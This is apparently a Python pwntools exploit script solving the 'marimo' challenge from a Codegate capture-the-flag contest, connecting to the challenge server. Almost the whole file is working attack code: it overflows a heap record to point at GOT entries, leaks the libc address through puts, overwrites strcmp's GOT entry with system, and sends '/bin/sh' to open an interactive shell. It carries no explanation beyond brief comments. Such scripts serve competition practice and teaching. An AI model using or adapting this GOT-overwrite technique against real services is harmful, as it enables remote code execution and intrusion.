#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

binary = './marimo'
elf = ELF(binary)
libc = elf.libc

#io = process(binary)
io = remote('ch41l3ng3s.codegate.kr', 3333)
context.log_level = 'debug'
pause()

def show_me_the_marimo(name, profile):
    io.recvuntil(">>")
    io.sendline('show me the marimo')
    io.recvuntil("What's your new marimo's name? (0x10)")
    io.recvuntil(">>")
    io.sendline(name)
    io.recvuntil(">>")
    io.sendline(profile)

def View():
    io.recvuntil(">>")
    io.sendline('V')

def Buy(sz):
    io.recvuntil(">>")
    io.sendline('B')
    io.recvuntil(">>")
    io.sendline(str(sz))
    io.recvuntil(">>")
    io.sendline('P')

def Sell():
    io.recvuntil(">>")
    io.sendline(str(idx))
    io.recvuntil("?")
    io.sendline('S')

show_me_the_marimo('a' * 8, 'a' * 8)
show_me_the_marimo('b' * 8, 'b' * 8)
show_me_the_marimo('c' * 8, 'c' * 8)

sleep(2)
View()
io.recvuntil(">>")
io.sendline('0')
io.recvuntil("?")
io.sendline('M')
io.sendline('a' * 0x20 + p64(0) + p64(0x20) + p32(0x1) + p32(0) + p64(elf.got['puts']) + p64(elf.got['strcmp']))
io.recvuntil("?")
io.sendline('B')

# leak libc
View()
io.recvuntil(">>")
io.sendline('1')
io.recvuntil("name : ")
libc.address = u64(io.recvuntil("\n")[:-1].ljust(8, '\x00')) - libc.symbols['puts']
print hex(libc.address)
io.recvuntil("?")
io.sendline('B')

# edit strcmp got 
View()
io.recvuntil(">>")
io.sendline('1')
io.recvuntil("?")
io.recvuntil(">> ")
io.sendline('M')
io.recvuntil(">> ")
io.sendline(p64(libc.symbols['system'])[:-1])
io.recvuntil("?")
io.recvuntil(">>")
io.sendline('B')
pause()

io.recvuntil(">>")
io.sendline('/bin/sh')

io.interactive()
